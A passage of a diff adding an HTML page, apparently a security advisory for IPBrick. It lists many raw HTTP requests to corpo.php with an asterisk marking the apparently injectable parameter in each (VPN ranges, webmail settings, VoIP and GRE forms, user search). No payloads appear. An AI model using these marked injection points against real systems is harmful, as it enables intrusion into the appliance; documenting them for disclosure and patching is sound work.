+pagina=vpn_configuracao_alterar_altera&amp;f_ip_inicio_1=192&amp;f_ip_inicio_2=168*&amp;f_ip_inicio_3=69&amp;f_ip_inicio_4=90&amp;f_ip_fim_1=192&amp;f_ip_fim_2=168&amp;f_ip_fim_3=69&amp;f_ip_fim_4=99&amp;f_accao=Modify
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/corpo.php
+pagina=vpn_configuracao_alterar_altera&amp;f_ip_inicio_1=192&amp;f_ip_inicio_2=168&amp;f_ip_inicio_3=69*&amp;f_ip_inicio_4=90&amp;f_ip_fim_1=192&amp;f_ip_fim_2=168&amp;f_ip_fim_3=69&amp;f_ip_fim_4=99&amp;f_accao=Modify
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/corpo.php
+pagina=vpn_configuracao_alterar_altera&amp;f_ip_inicio_1=192&amp;f_ip_inicio_2=168&amp;f_ip_inicio_3=69&amp;f_ip_inicio_4=90*&amp;f_ip_fim_1=192&amp;f_ip_fim_2=168&amp;f_ip_fim_3=69&amp;f_ip_fim_4=99&amp;f_accao=Modify
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/corpo.php
+-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"pagina\"\x0d\x0a\x0d\x0awebmail_alterado\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"imap_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"smtp_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"db_server\"\x0d\x0a\x0d\x0alocalhost\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"login_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"logo_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"can_export\"\x0d\x0a\x0d\x0at\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_users\"\x0d\x0a\x0d\x0a10000\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_prefs\"\x0d\x0a\x0d\x0aadministrator\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_calendar_info\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_show_company_logo\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_hide_never\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_one_year_max\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_state\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_resource_users\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_interval\"\x0d\x0a\x0d\x0a2\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"lastrmt\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_name[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_doAction[1]\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_action[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"show_alt_emails\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"horde_signature\"\x0d\x0a\x0d\x0a  *\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"f_accao\"\x0d\x0a\x0d\x0aModify\x0d\x0a-----------------------------11122813211374287858922608002--\x0d\x0a
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/corpo.php
+-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"pagina\"\x0d\x0a\x0d\x0awebmail_alterado\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"imap_server\"\x0d\x0a\x0d\x0aipbrick.domain.com*\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"smtp_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"db_server\"\x0d\x0a\x0d\x0alocalhost\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"login_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"logo_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"can_export\"\x0d\x0a\x0d\x0at\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_users\"\x0d\x0a\x0d\x0a10000\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_prefs\"\x0d\x0a\x0d\x0aadministrator\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_calendar_info\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_show_company_logo\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_hide_never\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_one_year_max\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_state\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_resource_users\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_interval\"\x0d\x0a\x0d\x0a2\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"lastrmt\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_name[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_doAction[1]\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_action[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"show_alt_emails\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"horde_signature\"\x0d\x0a\x0d\x0a  \x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"f_accao\"\x0d\x0a\x0d\x0aModify\x0d\x0a-----------------------------11122813211374287858922608002--\x0d\x0a
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/corpo.php
+-----------------------------1263099156734327261671054908\x0d\x0aContent-Disposition: form-data; name=\"pagina\"\x0d\x0a\x0d\x0avoip_placas_pstn_submitdb\x0d\x0a-----------------------------1263099156734327261671054908\x0d\x0aContent-Disposition: form-data; name=\"tipoplaca\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------1263099156734327261671054908\x0d\x0aContent-Disposition: form-data; name=\"manufacturer\"\x0d\x0a\x0d\x0a6\x0d\x0a-----------------------------1263099156734327261671054908\x0d\x0aContent-Disposition: form-data; name=\"numportas\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------1263099156734327261671054908\x0d\x0aContent-Disposition: form-data; name=\"interface1\"\x0d\x0a\x0d\x0aPSTN*\x0d\x0a-----------------------------1263099156734327261671054908\x0d\x0aContent-Disposition: form-data; name=\"porta1\"\x0d\x0a\x0d\x0aTE PtP\x0d\x0a-----------------------------1263099156734327261671054908\x0d\x0aContent-Disposition: form-data; name=\"inserir\"\x0d\x0a\x0d\x0aInsert\x0d\x0a-----------------------------1263099156734327261671054908--\x0d\x0a
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/corpo.php
+pagina=gre_alt_acc*&amp;idgre=2&amp;reload=1&amp;control=2&amp;lastrmt=0&amp;name=a&amp;description=b&amp;active=t&amp;lo_ip1=10&amp;lo_ip2=0&amp;lo_ip3=0&amp;lo_ip4=253&amp;li_ip1=192&amp;li_ip2=168&amp;li_ip3=69&amp;li_ip4=199&amp;ro_ip1=1&amp;ro_ip2=1&amp;ro_ip3=1&amp;ro_ip4=12&amp;alterar=Modify
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>GET
+https://ipbrick.domain.com/corpo.php?pagina=utilizador_ver_lista&amp;offset=0&amp;first_char=&amp;pesq_nome=*
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/corpo.php
+-----------------------------1263099156734327261671054908\x0d\x0aContent-Disposition: form-data; name=\"pagina\"\x0d\x0a\x0d\x0avoip_placas_pstn_submitdb\x0d\x0a-----------------------------1263099156734327261671054908\x0d\x0aContent-Disposition: form-data; name=\"tipoplaca\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------1263099156734327261671054908\x0d\x0aContent-Disposition: form-data; name=\"manufacturer\"\x0d\x0a\x0d\x0a6\x0d\x0a-----------------------------1263099156734327261671054908\x0d\x0aContent-Disposition: form-data; name=\"numportas\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------1263099156734327261671054908\x0d\x0aContent-Disposition: form-data; name=\"interface1\"\x0d\x0a\x0d\x0aPSTN\x0d\x0a-----------------------------1263099156734327261671054908\x0d\x0aContent-Disposition: form-data; name=\"porta1\"\x0d\x0a\x0d\x0aTE PtP*\x0d\x0a-----------------------------1263099156734327261671054908\x0d\x0aContent-Disposition: form-data; name=\"inserir\"\x0d\x0a\x0d\x0aInsert\x0d\x0a-----------------------------1263099156734327261671054908--\x0d\x0a
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/corpo.php
+-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"pagina\"\x0d\x0a\x0d\x0awebmail_alterado\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"imap_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"smtp_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"db_server\"\x0d\x0a\x0d\x0alocalhost\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"login_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"logo_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"can_export\"\x0d\x0a\x0d\x0at\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_users\"\x0d\x0a\x0d\x0a10000\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_prefs\"\x0d\x0a\x0d\x0aadministrator\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_calendar_info\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_show_company_logo\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_hide_never\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_one_year_max\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_state\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_resource_users\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_interval\"\x0d\x0a\x0d\x0a2*\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"lastrmt\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_name[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_doAction[1]\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_action[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"show_alt_emails\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"horde_signature\"\x0d\x0a\x0d\x0a  \x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"f_accao\"\x0d\x0a\x0d\x0aModify\x0d\x0a-----------------------------11122813211374287858922608002--\x0d\x0a
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/corpo.php
+-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"pagina\"\x0d\x0a\x0d\x0awebmail_alterado\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"imap_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"smtp_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"db_server\"\x0d\x0a\x0d\x0alocalhost\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"login_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"logo_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"can_export\"\x0d\x0a\x0d\x0at\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_users\"\x0d\x0a\x0d\x0a10000\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_prefs\"\x0d\x0a\x0d\x0aadministrator\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_calendar_info\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_show_company_logo\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_hide_never\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_one_year_max\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_state\"\x0d\x0a\x0d\x0a0*\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_resource_users\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_interval\"\x0d\x0a\x0d\x0a2\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"lastrmt\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_name[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_doAction[1]\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_action[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"show_alt_emails\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"horde_signature\"\x0d\x0a\x0d\x0a  \x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"f_accao\"\x0d\x0a\x0d\x0aModify\x0d\x0a-----------------------------11122813211374287858922608002--\x0d\x0a
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/corpo.php
+-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"pagina\"\x0d\x0a\x0d\x0awebmail_alterado\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"imap_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"smtp_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"db_server\"\x0d\x0a\x0d\x0alocalhost\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"login_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"logo_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"can_export\"\x0d\x0a\x0d\x0at\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_users\"\x0d\x0a\x0d\x0a10000\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_prefs\"\x0d\x0a\x0d\x0aadministrator\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_calendar_info\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_show_company_logo\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_hide_never\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_one_year_max\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_state\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_resource_users\"\x0d\x0a\x0d\x0a*\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_interval\"\x0d\x0a\x0d\x0a2\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"lastrmt\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_name[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_doAction[1]\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_action[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"show_alt_emails\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"horde_signature\"\x0d\x0a\x0d\x0a  \x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"f_accao\"\x0d\x0a\x0d\x0aModify\x0d\x0a-----------------------------11122813211374287858922608002--\x0d\x0a
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/corpo.php
+-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"pagina\"\x0d\x0a\x0d\x0awebmail_alterado\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"imap_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"smtp_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"db_server\"\x0d\x0a\x0d\x0alocalhost\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"login_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"logo_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"can_export\"\x0d\x0a\x0d\x0at\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_users\"\x0d\x0a\x0d\x0a10000\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_prefs\"\x0d\x0a\x0d\x0aadministrator\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_calendar_info\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_show_company_logo\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_hide_never\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_one_year_max\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_state\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_resource_users\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_interval\"\x0d\x0a\x0d\x0a2\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"lastrmt\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_name[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_doAction[1]\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_action[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"show_alt_emails\"\x0d\x0a\x0d\x0a0*\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"horde_signature\"\x0d\x0a\x0d\x0a  \x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"f_accao\"\x0d\x0a\x0d\x0aModify\x0d\x0a-----------------------------11122813211374287858922608002--\x0d\x0a
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/corpo.php
+-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"pagina\"\x0d\x0a\x0d\x0awebmail_alterado\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"imap_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"smtp_server\"\x0d\x0a\x0d\x0aipbrick.domain.com*\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"db_server\"\x0d\x0a\x0d\x0alocalhost\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"login_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"logo_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"can_export\"\x0d\x0a\x0d\x0at\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_users\"\x0d\x0a\x0d\x0a10000\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_prefs\"\x0d\x0a\x0d\x0aadministrator\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_calendar_info\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_show_company_logo\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_hide_never\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_one_year_max\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_state\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_resource_users\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_interval\"\x0d\x0a\x0d\x0a2\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"lastrmt\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_name[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; 